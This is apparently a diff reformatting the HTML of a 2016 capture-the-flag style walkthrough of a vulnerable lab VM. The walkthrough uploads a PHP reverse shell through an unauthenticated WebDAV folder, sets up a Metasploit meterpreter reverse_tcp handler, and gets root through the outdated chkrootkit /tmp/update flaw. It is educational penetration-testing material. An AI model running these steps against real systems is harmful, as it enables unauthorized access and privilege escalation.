@@ -79,19 +79,14 @@
     <h2 class="subtitle is-5">December 20, 2016 by Alex Flores</h2>
     
     <div class="content">
-      
-
-<h2 id="executive-summary">Executive Summary</h2>
-
+      <h2 id="executive-summary">Executive Summary</h2>
 <p>This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be
 executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to
 explore the system for additional vulnerabilities which could lead to a full compromise. During the
 exploration, an outdated version of <code>chkrootkit</code> was found. By exploiting a known vulnerability in the way
 <code>chkrootkit</code> parses arguments, an attacker could create a malicious file that would later be run by
 <code>chkrootkit</code> as a fully privileged user.</p>
-
 <h2 id="tools-used">Tools used</h2>
-
 <ul>
 <li>nmap - discovery</li>
 <li>uniscan - web application scanner</li>
@@ -99,79 +94,43 @@ exploration, an outdated version of <code>chkrootkit</code> was found. By exploi
 <li>msfvenom - payload generation</li>
 <li>local-linux-enum script - enumeration</li>
 </ul>
-
 <h2 id="proof-of-concept">Proof of Concept</h2>
-
 <p>In order to cut down on typing, once the IP of the victim computer is discovered, it can be added to the
 <code>/etc/hosts</code>.</p>
-
-<pre><code class="language-bash.prettyprint">echo &quot;192.168.1.188 vm&quot; &gt;&gt; /etc/hosts
-</code></pre>
-
-<p>We begin with scanning the victim&rsquo;s machine and find ports 80 and 22.</p>
-
-<pre><code class="language-bash.prettyprint">❯❯ nmap -p - -A vm | tee nmap.scan
-</code></pre>
-
-<p><img src="https://i.imgur.com/jQr872J.png" alt="" /></p>
-
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.188 vm&quot; &gt;&gt; /etc/hosts
+</code></pre><p>We begin with scanning the victim's machine and find ports 80 and 22.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ nmap -p - -A vm | tee nmap.scan
+</code></pre><p><img src="https://i.imgur.com/jQr872J.png" alt=""></p>
 <p>Navigating to the page and checking its source code reveals nothing</p>
-
-<p><img src="https://i.imgur.com/1Oigcfa.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/1Oigcfa.png" alt=""></p>
 <p>Running <code>uniscan</code>, a folder named <code>test</code> is discovered</p>
-
-<pre><code class="language-bash.prettyprint">❯❯ uniscan -qweds -u http://vm/ 
-</code></pre>
-
-<p><img src="https://i.imgur.com/wU5Wp2v.png" alt="" /></p>
-
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ uniscan -qweds -u http://vm/ 
+</code></pre><p><img src="https://i.imgur.com/wU5Wp2v.png" alt=""></p>
 <p>The listing appeared to be empty but further examination of the <code>/test</code> path revealed that it responded to
 more than just HTTP methods. <code>COPY</code> and <code>MOVE</code> seemed to indicate WebDAV.</p>
-
-<pre><code class="language-bash.prettyprint">❯❯ curl -vX OPTIONS vm/test
-</code></pre>
-
-<p><img src="https://i.imgur.com/6GKZJbc.png" alt="" /></p>
-
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ curl -vX OPTIONS vm/test
+</code></pre><p><img src="https://i.imgur.com/6GKZJbc.png" alt=""></p>
 <p>This path requires no authentication and thus allows attackers to upload files to the web server.</p>
-
-<p><img src="https://i.imgur.com/gSzuoHZ.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/gSzuoHZ.png" alt=""></p>
 <p>Verifying successful upload:</p>
-
-<p><img src="https://i.imgur.com/CpTqKyO.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/CpTqKyO.png" alt=""></p>
 <p>Having uploaded the reverse shell, the Meterpreter handler is constructed</p>
-
-<pre><code class="language-bash.prettyprint">set PAYLOAD php/meterpreter/reverse_tcp
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">set PAYLOAD php/meterpreter/reverse_tcp
 set LHOST 80
 run -j
-</code></pre>
-
-<p>&hellip;and the payload is activated.</p>
-
-<pre><code class="language-bash.prettyprint">curl http://vm/test/sshhh.php
-</code></pre>
-
-<p><img src="https://i.imgur.com/XQ3a9Q4.png" alt="" /></p>
-
+</code></pre><p>&hellip;and the payload is activated.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">curl http://vm/test/sshhh.php
+</code></pre><p><img src="https://i.imgur.com/XQ3a9Q4.png" alt=""></p>
 <p>Once a shell has been established on the system, an enumeration script reveals what additional
 vulnerabilities might lead to a full compromise.</p>
-
 <p>The installed version of <code>chkrootkit</code> is outdated and vulnerable to a code execution exploit.</p>
-
-<p><img src="https://i.imgur.com/EJSijYp.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/EJSijYp.png" alt=""></p>
 <p>The ExploitDB gives the following description:</p>
-
-<p><img src="https://i.imgur.com/uVIlbic.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/uVIlbic.png" alt=""></p>
 <p>Using Metasploit, we create another handler and payload, using the <code>chkrootkit</code> module. This module will
 create/overwrite the <code>/tmp/update</code> file with the reverse tcp shell of your choosing. The next time
 <code>chkrootkit</code> is run, this update file will connect back to the attacker computer designated in the payload.</p>
-
-<p><img src="https://i.imgur.com/9GKQfrW.png" alt="" /></p>
+<p><img src="https://i.imgur.com/9GKQfrW.png" alt=""></p>
 
     </div>
     
